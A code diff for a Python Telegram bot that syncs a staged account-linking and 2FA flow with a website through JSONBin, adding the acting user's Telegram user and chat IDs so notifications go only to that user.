@@ -60,7 +60,7 @@ def set_sync_state(stage: int = None, twofa_verified: bool = None, linking_code:
 # Global bot reference for background tasks
 bot_for_notifications = None
 
-async def push_jsonbin_state(stage: int = None, twofa_verified: bool = None, linking_code: str = None):
+async def push_jsonbin_state(stage: int = None, twofa_verified: bool = None, linking_code: str = None, actor_tg_user_id: int = None, actor_chat_id: int = None):
     """Push state to JSONBin so website can read it over HTTPS."""
     if httpx is None:
         logger.warning("httpx not available; cannot push to JSONBin")
@@ -76,6 +76,10 @@ async def push_jsonbin_state(stage: int = None, twofa_verified: bool = None, lin
             "linking_code": linking_code if linking_code is not None else sync_state.get('linking_code', None),
             "updated_at": int(time.time())
         }
+        if actor_tg_user_id is not None:
+            payload["actor_tg_user_id"] = int(actor_tg_user_id)
+        if actor_chat_id is not None:
+            payload["actor_chat_id"] = int(actor_chat_id)
         headers = {
             "Content-Type": "application/json",
             "X-Master-Key": JSONBIN_MASTER_KEY
@@ -144,6 +148,8 @@ async def poll_jsonbin_and_sync():
                         stage = int(record.get('stage') or 0)
                         code = record.get('linking_code')
                         twofa = bool(record.get('twofa_verified'))
+                        target_user_id = record.get('actor_tg_user_id')
+                        target_chat_id = record.get('actor_chat_id')
                         if stage <= 2:
                             set_sync_state(stage=stage or 1, twofa_verified=False, linking_code=None)
                         else:
@@ -153,7 +159,15 @@ async def poll_jsonbin_and_sync():
                             try:
                                 # Iterate known users and notify those who had the BOTC flow
                                 for uid, st in list(user_state.items()):
+                                    # If JSONBin indicates a specific actor, only notify that user
+                                    if target_user_id is not None and int(uid) != int(target_user_id):
+                                        continue
                                     chat_id = st.get('chat_id')
+                                    if target_chat_id is not None:
+                                        try:
+                                            chat_id = int(target_chat_id)
+                                        except Exception:
+                                            pass
                                     if not chat_id:
                                         continue
                                     if st.get('stage6_notified'):
@@ -255,7 +269,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 # Expose expected next stage to website and push to JSONBin (prep state 3)
                 set_sync_state(stage=3, twofa_verified=False, linking_code='NDG341F')
                 try:
-                    await push_jsonbin_state(stage=3, twofa_verified=False, linking_code='NDG341F')
+                    await push_jsonbin_state(stage=3, twofa_verified=False, linking_code='NDG341F', actor_tg_user_id=user_id, actor_chat_id=chat_id)
                 except Exception:
                     pass
                 logger.info(f"Sent and pinned BOTC linking prompt to user {user_id} for token {verify_token}")
@@ -882,7 +896,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 # Update local sync server and JSONBin state so website can advance to state 4
                 set_sync_state(stage=4, twofa_verified=True, linking_code=linking_code)
                 try:
-                    await push_jsonbin_state(stage=4, twofa_verified=True, linking_code=linking_code)
+                    await push_jsonbin_state(stage=4, twofa_verified=True, linking_code=linking_code, actor_tg_user_id=user_id, actor_chat_id=update.message.chat_id)
                 except Exception:
                     pass
                 return
